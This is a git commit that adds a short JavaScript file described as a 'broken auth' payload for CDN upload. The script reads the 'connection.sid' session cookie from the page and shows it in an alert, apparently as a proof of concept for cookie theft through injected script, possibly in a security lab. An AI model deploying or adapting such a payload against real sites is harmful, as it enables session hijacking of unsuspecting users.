7b09046814b21a3154afeaf484a7577bf80525f6
Sam Chaara <Sam.R.Chaara@gmail.com>
2020-08-10 15:50:45 -0500

    broken auth js payload (for cdn upload)

---
+++ payloads/broken_auth.js
@@ -0,0 +1,8 @@
+//Finding/Parsing cookies: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+const cookieName = "connection.sid";
+const cookieValue = document.cookie
+    .split("; ")
+    .find((row) => row.startsWith(cookieName))
+    .split("=")[1];
+
+alert(`${cookieName}=${cookieValue}`);
